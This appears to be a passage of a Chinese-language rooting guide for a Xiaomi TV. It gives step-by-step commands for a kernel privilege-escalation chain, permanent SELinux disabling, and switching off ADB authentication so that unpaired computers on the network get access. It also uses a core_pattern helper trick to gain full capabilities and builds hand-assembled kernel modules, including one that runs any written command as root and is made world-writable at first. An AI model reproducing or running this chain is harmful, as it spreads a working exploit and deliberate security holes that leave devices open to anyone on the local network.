    "rescue_boot.script": """\
echo === USB EXTREME RESCUE ===
if fatload usb 0 ${loadaddr} boot_rescue.img; then
  store write boot ${loadaddr} 0 ${filesize}
  echo boot partition written
else
  echo WARN: boot_rescue.img not found, skip
fi
if fatload usb 0 ${loadaddr} twrp.img; then
  bootm ${loadaddr}
else
  echo no twrp.img, reset
  reset
fi
""",
}


def main():
    ap = argparse.ArgumentParser(description="U-Boot legacy script 打包器")
    ap.add_argument("--text", help="脚本文本文件")
    ap.add_argument("--out", help="输出镜像路径")
    ap.add_argument("--name", default="usb_rescue", help="镜像 name 字段(<=32B)")
    ap.add_argument("--demo", action="store_true", help="生成全部标准脚本")
    ap.add_argument("--outdir", default=".", help="demo 输出目录")
    a = ap.parse_args()

    if a.demo:
        import os
        os.makedirs(a.outdir, exist_ok=True)
        for fn, text in SCRIPTS.items():
            blob = build_script_image(text, fn.split(".")[0].encode())
            out = os.path.join(a.outdir, fn.replace(".script", "") + "_autoscript")
            open(out, "wb").write(blob)
            print(f"=== {out} ({len(blob)}B) ===")
            if not verify_image(blob):
                sys.exit("自检失败: " + out)
        # 同时把明文脚本也放出来便于审阅
        for fn, text in SCRIPTS.items():
            open(os.path.join(a.outdir, fn), "w", newline="\n").write(text)
        print("全部生成并自检通过")
        return

    if not a.text or not a.out:
        ap.error("需要 --text 与 --out, 或 --demo")
    text = open(a.text, encoding="utf-8").read()
    blob = build_script_image(text, a.name.encode())
    open(a.out, "wb").write(blob)
    print(f"生成 {a.out} ({len(blob)}B)")
    if not verify_image(blob):
        sys.exit("自检失败")


if __name__ == "__main__":
    main()
```

生成命令（内置五项格式自检）:

```
python scripts/build_autoscript.py --demo --outdir 输出目录
python scripts/build_autoscript.py --text 自定义脚本.txt --out aml_autoscript
```

## 操作步骤

### 1. 编译

```bash
zig cc -target arm-linux-musleabihf -O1 -static -o bin/gpu_arb_write src/gpu_arb_write.c
zig cc -target aarch64-linux-musl    -O1 -static -o bin/kfunc          src/kfunc.c
zig cc -target arm-linux-musleabihf -O1 -static -o bin/su     src/su.c
zig cc -target arm-linux-musleabihf -O1 -static -o bin/setcap src/setcap.c
```

编译完看一眼 ELF 头的 machine 字段：gpu_arb_write、su、setcap 应该是 `0x28`（armv7），kfunc 应该是 `0xb7`（aarch64）。搞反了上机必挂。

### 2. 算地址

```bash
python scripts/extract_kernel.py fw/update-xmen.zip      # 输出 vmlinux.img
adb shell "cat /proc/kallsyms" > fw/kallsyms_dev.txt
python scripts/calc_addr.py vmlinux.img fw/kallsyms_dev.txt
```

3396 固件上的正常输出：

```
符号数: 85315, _text = 0xffffffc001080000
sys_call_table[244..259] 空槽校验通过
KLN_ADDR             = ffffffc00111f308
SLOT_PHYS            = 1f737a0
selinux_enforcing    = ffffffc00216f7bc
core_pattern         = ffffffc001fa93c8
memcpy               = ffffffc0013e76b0
```

这五个值里 KLN_ADDR 和 SLOT_PHYS 是要喂给 run.sh 的，另外三个由运行期解析，解析出来的值和离线计算值对得上才算地址可信。三道校验（符号数一致、num_syms 匹配、空槽全指向 sys_ni_syscall）有一道不过就不要上机。

顺带一个辅助核对：`/proc/iomem` 里 Kernel code 段的起始地址应该等于 `_text` 的物理地址（本机是 0x01080000），对得上说明线性映射假设成立。

### 3. 提权

先把要部署的东西都准备到设备上：

```bash
adb push bin/gpu_arb_write bin/kfunc bin/su bin/setcap /data/local/tmp/
adb push scripts/run.sh scripts/roothelper.sh /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/gpu_arb_write /data/local/tmp/kfunc \
                        /data/local/tmp/run.sh /data/local/tmp/roothelper.sh"

# build.prop 修改版（python 字节级替换，不要在设备上 sed）
adb exec-out "cat /system/build.prop" > fw/build.prop.cur
python -c "
d = open('fw/build.prop.cur','rb').read()
assert d.count(b'ro.adb.secure=1') == 1
open('build.prop.new','wb').write(d.replace(b'ro.adb.secure=1', b'ro.adb.secure=0'))
"
adb push build.prop.new /sdcard/build.prop.new

# install-recovery 接管版（ADB 常驻巡查 + 移除 applypatch 还原逻辑）
# 部署由 roothelper 完成；原版先留底
adb pull /system/bin/install-recovery.sh fw/install-recovery.sh.bak
adb push scripts/install-recovery.sh.new2 /sdcard/install-recovery.sh.new2
```

执行提权链。注意用后台方式跑、输出落 /sdcard——adb 会话有可能中途断，落盘的输出断了也能再读：

```bash
adb shell "rm -f /sdcard/run_out.txt; \
  echo '#!/system/bin/sh' > /sdcard/bg.sh; \
  echo 'cd /data/local/tmp' >> /sdcard/bg.sh; \
  echo './run.sh > /sdcard/run_out.txt 2>&1' >> /sdcard/bg.sh; \
  echo 'echo EXIT=\$? >> /sdcard/run_out.txt' >> /sdcard/bg.sh; \
  chmod 755 /sdcard/bg.sh; ( sh /sdcard/bg.sh & )"
sleep 30
adb shell "cat /sdcard/run_out.txt"
```

成功的标志：`getenforce -> Permissive`，然后 `success - helper ran as root:`，root.log 里是 `uid=0(root) ... context=u:r:kernel:s0`。

```bash
adb shell "su -c id"     # uid=0(root)
```

### 4. env 分区：SELinux 源头禁用

```bash
adb shell "su -c 'dd if=/dev/block/env of=/sdcard/env_backup.bin bs=262144'"
adb pull /sdcard/env_backup.bin backup/env_backup.bin      # 留底，必做

python scripts/patch_env.py backup/env_backup.bin          # 生成 env_new.bin
adb push env_new.bin /sdcard/env_new.bin
adb shell "su -c 'dd if=/sdcard/env_new.bin of=/dev/block/env bs=4096 count=17; sync'"

# 回读校验
adb shell "su -c 'dd if=/dev/block/env of=/sdcard/env_verify.bin bs=4096 count=17'"
adb pull /sdcard/env_verify.bin backup/env_verify.bin
python -c "
import zlib, struct
b = open('backup/env_verify.bin','rb').read()
a = open('env_new.bin','rb').read()[:len(b)]
print('一致:', a == b)
print('CRC:', zlib.crc32(b[4:0x10000]) & 0xffffffff == struct.unpack('<I', b[:4])[0])
print('permissive:', b'androidboot.selinux=permissive' in b)
"
adb reboot
```

重启之后 `getprop ro.boot.selinux` 应该是 `permissive`，`getenforce` 是 Permissive，`su -c id` 直接是 uid=0——到这里 SELinux 就永久关掉了。

### 5. 验收 ADB

重启完成后直接连，全程不要碰设置页：

```bash
adb connect <电视IP>:5555     # 直接 device
adb shell "getprop ro.adb.secure"             # 0
adb shell "settings get global adb_enabled"   # 1（设置页显示「允许」）
adb shell "su -c 'netstat -tln | grep 5555'"  # LISTEN
```

换一台从没授权过的电脑连一下，也应该直接通过——配对要求已经取消了。

### 6. 替换 recovery 为补丁版 TWRP（可选，建议做）

原生第三方 TWRP 的 ramdisk 里自带 `systemcontrol_static`（Amlogic ubootenv 管理工具）。每次进出 TWRP，它都可能把 env 分区改回官方默认值——env 里的 permissive 被抹掉，root 持久化被破坏。所以刷 TWRP 之前必须先打补丁：

```bash
python scripts/rebuild_twrp.py twrp.img        # 输出 twrp_patched.img，自检不过就停
adb push twrp_patched.img /sdcard/twrp_patched.img
adb shell "su -c 'dd if=/sdcard/twrp_patched.img of=/dev/block/recovery bs=4096; sync'"

# 回读校验：分区前缀应与镜像逐字节一致
adb shell "su -c 'dd if=/dev/block/recovery of=/sdcard/rb.bin bs=4096'"
adb pull /sdcard/rb.bin rb.bin
python -c "
src = open('twrp_patched.img','rb').read()
print('分区前缀一致:', open('rb.bin','rb').read()[:len(src)] == src)
"
```

补丁只做一件事：把 ramdisk 里的 systemcontrol_static 换成空脚本。TWRP 其余功能（Install / Backup / Restore / Terminal / Mount）不受影响。

同时确认 `/system/bin/install-recovery.sh` 已经是接管版（scripts/install-recovery.sh.new2，applypatch 还原逻辑已移除），否则每次开机官方钩子会把 recovery 刷回去。

验证 TWRP：`su -c 'reboot recovery'` 或断电后按住确认键通电，看到 TWRP 主界面即成功。第一次进入会弹「Keep System Read only?」，勾选不再提示后滑「Allow Modifications」。用 USB 鼠标操作（触屏大概率没反应）。TWRP 的 adb 只走 USB 线，网络连不上是正常的。

**警告：TWRP 里不要碰 Wipe -> Format Data / Factory Reset，那会清空用户数据，不可逆。**

每次进出 TWRP 之后，建议复查一次 env 是否仍然干净：

```bash
adb shell "su -c 'dd if=/dev/block/env of=/sdcard/env_check.bin bs=4096 count=17'"
adb pull /sdcard/env_check.bin env_check.bin
python -c "print('permissive:', open('env_check.bin','rb').read().find(b'androidboot.selinux=permissive') >= 0)"
```

输出 False 就按步骤 4 重写一遍 env。

### 7. 构建并刷入完全体 boot.img（把一切焊死进内核）

前置：第 3、4、5 步已完成（exploit 可用、env 已改、/system 钩子已就位），并且已经确认了
本机内核的四个补丁位置（第 2 节算地址时从符号表可得，详见 build_full_boot.py 内注释）。

**先备齐 /data 二进制**（一次性，掉电保存；恢复出厂 data 后重推一遍即可）：

```bash
# 二进制来源：第 1 节编译产物 + SSH 服务的现成成品
adb push bin/su /data/local/tmp/su
adb push dropbear /data/local/tmp/dropbear        # dropbear 2025.88 aarch64 静态版
adb push sftp /data/local/tmp/sftp                # 配套 sftp-server
adb push busybox /data/local/tmp/bb               # 任一静态 busybox（工具箱用）
adb push httpd /data/local/tmp/httpd              # 自研文件服务器，源码见上文
adb push scripts/install-recovery.sh.new2 /data/local/tmp/install-recovery.sh.new2
adb shell "chmod 755 /data/local/tmp/dropbear /data/local/tmp/sftp /data/local/tmp/bb /data/local/tmp/httpd"
```

**生成 SSH 主机钥匙**（必须用 dropbearkey 生成原生格式，OpenSSH 格式的钥匙 dropbear
解析时会报 String too long 直接退出）：

```bash
adb push dropbearkey /data/local/tmp/dropbearkey
adb shell "chmod 755 /data/local/tmp/dropbearkey"
adb shell "/data/local/tmp/dropbearkey -t ed25519 -f /data/local/tmp/hostkey_native"
adb pull /data/local/tmp/hostkey_native dropbear-bin/hostkey_native
```

**客户端密钥对**（电脑上生成一次，公钥放进镜像里的 authorized_keys）：

```bash
ssh-keygen -t ed25519 -f host_ed25519 -N ""      # 主机钥匙占位（实际用上面的原生钥匙）
ssh-keygen -t ed25519 -f tv_client_ed25519 -N "" # 登录用的客户端密钥
```

**装配镜像**（`scripts/build_full_boot.py`，完整源码见源码一节；三重自检不过就不会产出文件）：

```bash
python scripts/build_full_boot.py
# 产物: boot_full.img —— 内核四补丁 + 迷你系统(属性/服务//heal 脚本与钥匙)
```

**刷入与验收**：

```bash
adb push boot_full.img /sdcard/boot_full.img
adb shell "su -c 'dd if=/sdcard/boot_full.img of=/dev/block/boot bs=4096; sync'"
adb shell "su -c 'dd if=/dev/block/boot of=/sdcard/rb.bin bs=4096'"   # 回读校验
adb pull /sdcard/rb.bin rb.bin   # 与镜像逐字节比对前缀
adb shell reboot
```

重启后验收清单：

```bash
adb connect <电视IP>:5555                          # 应直接连上
adb shell "cat /proc/version"                      # 含 XMENOK01
adb shell "su -c 'dmesg | head -1'"                # 同样含 XMENOK01
adb shell "getenforce"                             # Permissive
adb shell "su -c 'setenforce 1; sleep 1; getenforce'"   # 仍是 Permissive —— 焊死生效
ssh -i tv_client_ed25519 root@<电视IP>             # 直登 root
# 浏览器打开 http://<电视IP>:8080 —— 文件列表
```

三个 SSH 配置要点（任何一个不满足都会登录失败，报错却很含糊）：

1. **主机钥匙必须是 dropbear 原生格式**（dropbearkey 生成），OpenSSH 格式会在启动时
   报 `String too long` 退出；
2. **/etc/shells 必须存在且含登录 shell**（heal.sh 开机自动创建），否则一律拒绝：
   `User 'root' has invalid shell, rejected`；
3. **登录用户的家目录必须归 root 或本人所有、组/他人不可写**（heal.sh 开机专建
   `sshhome` 目录并把 passwd 指向它），否则 StrictModes 直接拒绝。

日常维护注意：`adb push` 推上去的文件属主是 shell 且无执行位，需要设备端执行时，用
`adb shell chmod 755` 补（文件属主是 shell，shell 自己改自己的权限，不需要 root）。

### 8. 三版本一键对调（swap_boot.bat）

boot 分区可以随时在三个版本间切换，每版一分钟：

- `backupoot.img` —— 官方原版（保底）
- `boot_test.img` —— 实验版（仅身份标记）
- `boot_full.img` —— 完全体

```
swap_boot.bat boot_full.img     # 推送 -> dd 写入 -> 重启
```

### 9. 开机 Logo 自定义（可选，Root 门卫）

把开机第一屏的黑底 MI 图标换成自己的图。**这步同时是「设备已获得最高权限」的可视化标识：脚本设计为未拿到 Root 时拒绝替换，Root 确认后才写入**——看见自定义 Logo 就等于看见 Root 状态。

**宿主机构包**（任意方形 PNG，白底圆角图效果最接近原厂 MI 图标风格）：

```sh
python scripts/build_logo.py --src areyouok.png --out logo_areyouok.img
```

默认按原厂规格缩放（1080p 图标 142px、720p 96px，黑底居中）。想放大字号就改 `--icon-1080 280 --icon-720 187` 这类参数，尺寸是外置的。

**电视端替换**（Logo 分区改坏不影响系统引导，最坏就是开机黑屏，刷回备份即恢复）：

```sh
adb push logo_areyouok.img /data/local/tmp/
adb push scripts/flash_logo.sh /data/local/tmp/
adb shell sh /data/local/tmp/flash_logo.sh /data/local/tmp/logo_areyouok.img
```

脚本流程：探测 root（无 root 直接退出，不碰分区）→ 校验镜像头 → 备份当前 logo 到 `/data/local/tmp/logo_backup_时间戳.img` → dd 写入 → 回读逐字节校验（不一致自动回滚）→ 提示重启。重启后开机画面即为新图标。

### 10. U 盘引导 TWRP（救砖保险绳，零额外硬件）

U 盘制作（FAT32 单分区，根目录平铺，一次只插一个）:

| 文件 | 说明 |
|---|---|
| xmen.recovery | TWRP 镜像——U-Boot 原生识别名（主通道），内容 = recovery 分区里同一份 TWRP |
| recovery.img / twrp.img | 同镜像备用名，覆盖不同固件版本的识别差异 |
| Magisk-v19.1.zip | Root 包（Android 6.0.1 实测兼容版本） |
| test_ors.zip | OpenRecoveryScript 验证包（第 12 步用，零风险） |

本目录 usb_pack/ 已含全部文件（twrp.img / Magisk-v19.1.zip / test_ors.zip / aml_autoscript + 摆放说明），复制到 U 盘根目录并将 twrp.img 复制改名 xmen.recovery 与 recovery.img 即可。TWRP 镜像也可从已刷好的电视重新导出:

```sh
su -c 'dd if=/dev/block/recovery of=/sdcard/twrp.img bs=4096'
```

触发（三选一）:

```sh
adb shell reboot update
```

```
冷启动【确定键+返回键同时按住】不放再通电开机    # ADB 不通时 (实测有效)
特定红外码按住 2.5 秒             # irremote_update 变量
```

U-Boot 自动引导 U 盘 TWRP → Install → 选择 zip → 完成。这个通道不读任何 eMMC
分区——recovery 分区损坏、boot 分区损坏时它照样可用。

### 11. 未 Root 设备复用（六步完成 root）

本 U 盘直接适用于同款未 root 电视，全程工具 = U 盘 + WiFi 电脑 + USB 鼠标（可选）:

1. 电视开开发者模式与 ADB 调试（系统自带功能）
2. `adb connect 电视IP`
3. `adb shell reboot update` —— shell 用户身份即可执行，无需 root
4. U-Boot 自动引导 U 盘 TWRP → 插鼠标 → Install → 选择 Magisk-v19.1.zip
   （若报挂载失败，先 Mount 勾选 System 再刷）
5. Reboot → System
6. 安装 Magisk Manager（zip 内 common/magisk.apk），确认 Root 授权

### 12. BCB 自动化刷入（已 Root 设备，实测闭环）

**原理**: misc 分区头部的 Bootloader 控制块（BCB, 3072B 结构）是 Android 官方 OTA
自动安装接口——bootloader 与 recovery 通过它传递指令。root 权限直接写 BCB，
TWRP 启动时读取并执行其中的安装命令，完成后自动清除 BCB 并重启回系统。
**已实测闭环**: 预置 BCB → reboot recovery → TWRP 自动挂 U 盘刷入 test_ors.zip
（屏幕显示进度）→ 自动重启回桌面，全程无人值守 32 秒。

**重要边界**: 本系列固件的 su 是「空 capability 的 uid 0」（见注意事项第 6 条），
**无法直接写 /cache/recovery 目录**（目录 770 system:cache，无 DAC override 的
uid 0 进不去）——OpenRecoveryScript 文件方案在本机不可用，BCB 是唯一可行的
自动化通道（块设备 root 组可写）。

**BCB 构造**（生成 bcb_update.bin）:

```python
import struct
cmd = b'boot-recovery'
rec = b'recovery\n--update_package=/storage/<U盘挂载名>/test_ors.zip'
bcb = cmd.ljust(32, b'\x00') + bytes(32) + rec.ljust(768, b'\x00') \
    + bytes(1024) + bytes(32) + bytes(1184)          # 共 3072B
blob = bcb + bytes(4096 - len(bcb))
open('bcb_update.bin', 'wb').write(blob)
```

**写入与触发**:

```sh
adb push bcb_update.bin /sdcard/
adb shell su -c 'dd if=/sdcard/bcb_update.bin of=/dev/block/misc bs=4096 count=1; sync'
adb shell reboot recovery
```

**自动流程**: TWRP 读 BCB recovery 字段 → install U 盘上的 zip → 完成后清 BCB →
reboot system。刷入内容完全由 recovery 字段里的命令行决定（zip 路径可指向 U 盘
上的任意救援/升级包）。

**验证方式**（无串口时的闭环证据链）:

```sh
su -c 'dd if=/dev/block/cache bs=262144 | grep -a -c ors_test_executed_ok'   # 标记已写入 → 1
su -c 'dd if=/dev/block/misc bs=1 count=32'                                  # BCB 已被清空
```

**回滚**: `dd if=backup/misc.img of=/dev/block/misc bs=4096`（官方原版 misc 全镜像）。
**兜底**: BCB 格式错误时 TWRP 当普通 recovery 启动，无损害；正式使用前建议先用
test_ors.zip 验证流程。

命令集（BCB recovery 字段支持的指令同 OpenRecoveryScript）: install / mount /
wipe / format / backup / restore / reboot system 等。

### 13. U-Boot 串口控制台（uboot_console.py，可选工具）

HDMI1 的 DDC 引脚可引出调试串口（CP2102 类 USB-TTL，U-Boot 阶段 921600 波特率，
内核阶段 115200）。`scripts/uboot_console.py` 提供监听/发送/自动引导 U 盘 TWRP 三个
模式，全部输出落盘留证。U-Boot 只认 CR（回车）不认 LF。串口是可选增强通道——本文档
主流程全部不依赖它。

`research/` 目录收录 bootloader 分区研究结论（分区布局、AMLC 加密容器格式、
密钥来源判定、BL2 全部字符串、env 全部变量模板），供同平台研究者参考。

### 13. 内核模块工具链（LKM，无内核源码构建，实测闭环）

内核支持模块加载（kallsyms 有 sys_init_module/finit_module，无签名校验，无
MODVERSIONS——全表 0 个 __crc_* 符号），设备 /system/lib/*.ko 与 /proc/modules
的 wlan 运行模块即证。**构建无需内核源码与头文件**——手工组装 ELF：

1. 交叉编译（zig cc，模块 C 代码只声明 `extern int printk(const char*, ...)`，
   init/exit 函数名固定 init_module/cleanup_module）:

```sh
zig cc -target aarch64-linux-none -c -O2 -g0 -fno-PIE \
    -fno-stack-protector -fomit-frame-pointer hello_mod.c -o hello_mod.o
```

2. 组装（scripts/build_lkm.py，读 .o 补 .modinfo/.gnu.linkonce.this_module/
   重定位后输出 .ko）:

```sh
python scripts/build_lkm.py hello_mod.o hello_lkm hello_lkm.ko
```

3. 加载/卸载（核心坑: su 是空 capability 的 uid 0，`insmod` 需要
   CAP_SYS_MODULE——**走 core_pattern 管道 helper 通道**，内核以 root+全
   capability 执行 helper）:

   helper 与预编译模块位置：`scripts/lkm_helper.sh`（helper 本体，推到设备
   `/data/local/tmp/lkm_helper.sh`）；`bin/lkm/*.ko`（五模块预编译产物，
   vermagic `3.14.29 SMP preempt mod_unload aarch64`，同机型可直接 insmod，
   推到设备 `/data/adb/lkm/`——autolist.txt 按此路径引用）。自行编译用下方
   zig cc + build_lkm.py 流程。

```sh
adb push scripts/lkm_helper.sh /data/local/tmp/lkm_helper.sh
adb push bin/lkm/kctl.ko bin/lkm/kadblock.ko bin/lkm/kcrontab.ko bin/lkm/kcap.ko bin/lkm/kwatch.ko /data/adb/lkm/
su -c 'echo "|/data/local/tmp/lkm_helper.sh" > /proc/sys/kernel/core_pattern'
# lkm_helper.sh: 逐行读 lkm_queue.txt 执行 insmod、rmmod_queue.txt 执行 rmmod
echo /data/local/tmp/hello_lkm.ko > /data/local/tmp/lkm_queue.txt
sh -c 'sleep 30' & sleep 1; kill -SEGV $!     # 触发一次无害 coredump 启动 helper
su -c 'dmesg | grep hello_lkm'                # 验证 banner
echo hello_lkm > /data/local/tmp/rmmod_queue.txt
sh -c 'sleep 30' & sleep 1; kill -SEGV $!     # 同法卸载
```

**实测闭环证据**（dmesg）:

```
[ 3283.057673@1] <6>hello_lkm: module loaded on xmen - ORS/LKM chain OK
[ 3322.392140@2] <6>hello_lkm: module unloaded
```

**实测关键参数**（设备 cfg80211.ko 解析）: sizeof(struct module)=536、
name@24、init 指针@296、exit 指针@520、vermagic=
`3.14.29 SMP preempt mod_unload aarch64`。

**实用模块实例: kctl（/dev 设备 + /proc 公告，已实测）**——misc_register
注册 `/dev/kxmen`（misc 主设备号 10）+ `proc_create_data` 注册 `/proc/kxmen`:

```sh
echo "id > /data/local/tmp/o.txt 2>&1" > /dev/kxmen   # 写命令=全权执行(即时)
cat /dev/kxmen                                        # 读统计: execs/ok/last_ret/last
cat /proc/kxmen                                       # 同上(公告栏, 与 /dev 同源)
ioctl(fd, 0x4B01, &sb)                                # 结构化状态 {execs,oks,ret,last[96]}
```

- 执行体: `call_usermodehelper("/system/bin/sh", ["-c", cmd], NULL, UMH_WAIT_PROC)`
  —— **root + 全 capability + context=u:r:kernel:s0**（内核派发，比 su 更底层）
- `struct file_operations` 偏移按 3.14.29 fs.h 实测: read=0x10 write=0x18
  unlocked_ioctl=0x40 open=0x58 release=0x68；`struct miscdevice`: minor=0x00
  name=0x08 fops=0x10 mode=0x40；未填充字段保持 NULL（内核跳过）
- **关键坑: .rodata.cst* 常量节**——clang 把函数内小常量数组（如 12B 的
  "kctl: execs="）拆成 `.rodata.cst8`(8B) + movz 立即数。组装器 KEEP 集合若缺
  `.rodata.cst1/4/8/16`，常量节被丢 → 运行时字符串引用错位（表现为输出内容
  张冠李戴但无崩溃）。build_lkm.py 已内置收录。
- 手工构建的 .ko 里模块内函数指针以「SECTION 符号 + addend」编码
  （R_AARCH64_ABS64, S=节基址 A=节内偏移）——这是标准产物，内核重定位器正确处理；
  实证方法: addend 反解回原始 .o 的函数符号 st_value 逐一对位。

**kx 包装（全权限补链，已实测）**——su 是「空 capability 的 uid 0」，mknod/
remount 等被拒（实测 `mknod: Permission denied` / `mount: Operation not permitted`）；
kx 经 /dev/kxmen 由内核派发全权执行，同一操作直接成功（实测 mknod 创建 1:3 节点、
remount /system）。`scripts/kx`:

```sh
#!/system/bin/sh
echo "$*" > /dev/kxmen
```

**LKM 持久化（开机自愈，已实测）**——init 服务的 flash_recovery 服务上下文自带
全 capability，insmod 直接可用。install-recovery.sh 在常驻循环前加（scripts/
install-recovery-lkm.sh）:

```sh
L=/data/adb/lkm/autolist.txt
if [ -f "$L" ]; then
    while read ko; do [ -f "$ko" ] && insmod "$ko" 2>/dev/null; done < "$L"
    [ -e /dev/kxmen ] && chmod 666 /dev/kxmen   # ueventd 会把节点重置为 0600, 这里拉回 0666
fi
```

模块文件放 `/data/adb/lkm/*.ko`，清单 autolist.txt 一行一个路径。**实测闭环**:
重启 → dmesg `[4.67s] kctl: /dev/kxmen + /proc/kxmen online` → 节点/权限/统计
全部就位，无需任何手动操作。

**实用模块实例: kadblock（DNS 捕获 + 内核级广告拦截，已实测）**——netfilter
双栈钩子（NFPROTO_IPV4=2 / NFPROTO_IPV6=10，LOCAL_OUT=3 挂点）+ /proc/kadblock
管理面。钩子内用 `skb_copy_bits` 安全读包 → UDP/53 检测 → DNS QNAME 逐字节解码 →
ring 记录 64 条（**找出广告域名源**）→ 黑名单后缀匹配 → NF_DROP（**广告请求在
内核层出不了门**，对所有 App 生效、零 CPU 占用）:

```sh
cat /proc/kadblock                      # 统计(raw/dns_total/dropped/rules) + 黑名单 + DNS 记录
su -c 'echo "add 广告域名" > /proc/kadblock'   # 加规则(子域名一并命中)
su -c 'echo "del 域名" > /proc/kadblock'       # 删规则; clear=清空规则; reset=统计清零
```

内置 6 条小米系广告/统计域名（ad.xiaomi.com / ad1.ad.xiaomi.com / api.ad.xiaomi.com /
tracking.miui.com / data.mistat.xiaomi.com / misstat.xiaomi.com），实测后台广告查询
即被拦截（dropped 计数增长）。模块已加入开机自愈清单（/data/adb/lkm/autolist.txt）。

**三个实测坑（kadblock 排错实录，适用一切 netfilter 手工模块）**:

1. **挂点选择**: 客户端设备的 DNS 查询是**出站包**，挂 `NF_INET_LOCAL_OUT`(3)
   而非 PRE_ROUTING(0)——PRE_ROUTING 只处理进入本机的包（响应方向）。
2. **skb_copy_bits 的 len 语义**: len 超过包剩余长度时**直接返回 -EFAULT（不部分
   拷贝）**。DNS QNAME 变长，必须 DNS 头读 12B + QNAME 逐字节/逐 label 读
   （len=1/len=label_len 永不越界），一次性预读大缓冲必然 EFAULT。
3. **ARM64 弱内存模型**: proc 写入的新规则（bl_valid 标志位）在另一 CPU 软中断
   上下文的 hook 里**观测不到**（volatile 不生成屏障）——写侧发内容→dmb ish→发
   标志→dmb ish，读侧循环前 dmb ish。x86 无此问题，ARM64 必须显式屏障。

**实测发现（抓包任务的情报价值）**: 本机 nslookup 强制指定 DNS 服务器的标准
UDP 查询被钩子完整捕获（sport->53 dst=218.85.152.99）且可正常拦截；但 **ping/
getaddrinfo 的系统正向解析在 UDP/53 与 TCP/53 上零流量**（解析却成功）——小米
系统 resolver 存在私有解析通道（DoH/厂商加速类，未占用 53 端口）。含义: UDP DNS
拦截覆盖标准 resolver 流量；系统应用若走私有通道则需后续在 TCP/443 流量识别层
扩展（kad 443 探针版本代码已留档 git 历史/工作目录）。

**实用模块实例: kcrontab（内核态定时守护，已实测）**——kthread 每秒 tick
（与 cmd_lkm 同架构，全部符号为已验证导出集，零结构布局风险）+ 8 个任务槽 +
call_usermodehelper 全权执行。**用户态死不了的定时器**——只要内核活着任务就跑:

```sh
cat /proc/kcrontab                            # tick/统计 + 任务清单
su -c 'echo "300|logcat -c" > /proc/kcrontab' # 添加: 每 5 分钟执行一次
su -c 'echo "del 1" > /proc/kcrontab'         # 删任务; clear=清空; reset=统计清零
```

任务持久化: `/data/adb/kcrontab.txt`（每行 `间隔秒|命令`），开机脚本自动喂回
（install-recovery-lkm.sh 的 LKM 块含 `cat /data/adb/kcrontab.txt > /proc/kcrontab`）。
模块纯净版无内置任务，示例任务（心跳 `60|date > kc_alive.txt`、日志清理 `600|logcat -c`）
见源码注释。**实测闭环**: 重启后三模块（kctl/kadblock/kcrontab）开机自动 Live、
任务清单自动恢复、心跳任务每 60 秒执行（dmesg `task ret=0`）。

**两个实战坑（kcrontab 排错实录）**:

1. **换装失败的静默性**: `core_pattern` 是 /proc 运行态参数，**重启即丢失**——
   忘记重设时 coredump 走默认 "core" 路径，helper 根本不执行，而 rmmod/insmod
   队列静默失败（无任何报错）。**判别指纹: lsmod 的 size 列与 tick 类计数连续**
   （模块从未卸载则 tick 不断裂）。换装前必须先确认 `cat /proc/sys/kernel/
   core_pattern` 是管道形式。
2. **cat 文件喂回的多行解析**: `cat file > /proc/xxx` 一次 write 携带多行——
   proc write 若只按单行解析，第二行会被并进第一行任务的内容里（跨行 cmd）。
   write 必须按 '\n' 切段逐行处理（process_line 循环）。

**实用模块实例: cmd_lkm（内核态命令通道，已实测）**——内核线程每 2 秒轮询
`/data/local/tmp/kcmd.txt`，发现命令行经 `call_usermodehelper` 以
**root + 全 capability + context=u:r:kernel:s0** 执行（绕开 su 的空 capability
缺陷）。用户态接口:

```sh
echo 'getenforce > /data/local/tmp/kcmd_out.txt 2>&1' > /data/local/tmp/kcmd.txt
sleep 4; cat /data/local/tmp/kcmd_out.txt     # → Permissive / uid=0(root) context=u:r:kernel:s0
```

源码 `lkm/cmd_lkm.c`（依赖符号全部经 kallsyms 核对: kthread_create_on_node /
filp_open / kernel_read / call_usermodehelper 等 10 个）。**.bss 注意**:
手工组装时 SHT_NOBITS 的 sh_size 必须取 .o 节头值（不是 0），否则全局缓冲
越界写 → panic（build_lkm.py 已内置处理）。**组装器三个必踩坑**（build_lkm.py
已内置处理）: ELF 头 e_shentsize 后字段顺序（少 2 字节全文件错位）、
shstrtab 一次性构造（两遍构造 name_offs 错位）、符号引用闭包过滤
（clang 残留的 $d.*/$x.* STT_SECTION 符号丢弃后变 UND → Unknown symbol 拒载）。

### 13.5 OTA 升级拦截与通道认证（多层防御，已实测）

**OTA 拦截**（防官方升级覆盖 root 的单点风险）——GitHub 交叉验证来源:
imSp4rky/小米盒子 twilight root gist（pm disable updateservice 实录）、
kuazhi 全系刷机指南（settings put global ota_disable 1）。本机侦察: 5 个
标准升级包名均不存在（OTA 内嵌 mitv.service 系统应用，无独立包名可禁）——
策略为**行为面多层堵截**:

1. `settings put global ota_disable 1`（标准开关）
2. **BCB 守卫**（终极防线）: 升级安装最后一步必写 misc 分区 BCB——
   /data/adb/bcb_guard.sh 每 120s（kcrontab）校验 misc 前 32B，非全零即
   清零+记录。**误伤规避**: 自己用 BCB 安装前先 `touch /data/local/tmp/
   bcb_guard_off`，用完删除。
3. 升级包缓存清理: kcrontab 每 30 分钟清 /cache/*ota* /sdcard/downloaded_rom
4. DNS 记录持久化: kcrontab 每 5 分钟 `cat /proc/kadblock >> /data/adb/kdns.log`
   （长期收集升级服务器域名线索，命中后加 kadblock 黑名单）

**kxmen 通道认证**（堵局域网/本机 App 无认证发全权命令的短板）:

- 威胁模型: permissive 下 SELinux 不拦，/dev/kxmen 666——任何 App/进程
  可直接写节点发 root+全caps 命令。
- 防线: token 前缀认证。命令必须为 `kt:<16hex>|<命令>` 形式；token 存
  `/data/adb/kx.token`（0600 root，App/普通 shell 读不到），kctl init 时
  读入内核内存（不在任何 755 文件里）。校验失败静默丢弃+dmesg 记录。
- **token 缺失 = 全部执行拒绝**（fail-closed 安全默认）。
- 入口脚本 kx v2: root 环境读 token 文件自动拼前缀——`su -c 'kx "命令"'`。
- **实测三重验证**: 无 token 拒绝 / 假 token 拒绝（AUTH FAIL 日志）/
  正 token 全权执行（uid=0, context=u:r:kernel:s0）。token 轮换 = 改
  kx.token 文件 + 重载 kctl 模块。

### 13.6 完整抓包器与完整性监控（kcap + kwatch，已实测）

**kcap（全流量 pcap 抓包器）**——netfilter 双钩（v4 in+out）→ 每包抓前 128B
（递减探测实际长度）→ ring 128 条存 **pcap 包记录格式**（LINKTYPE_RAW=101）→
/proc/kcap 输出记录流 → 落盘脚本补 24B 全局头 → **标准 .pcap（Wireshark 可开）**:

```sh
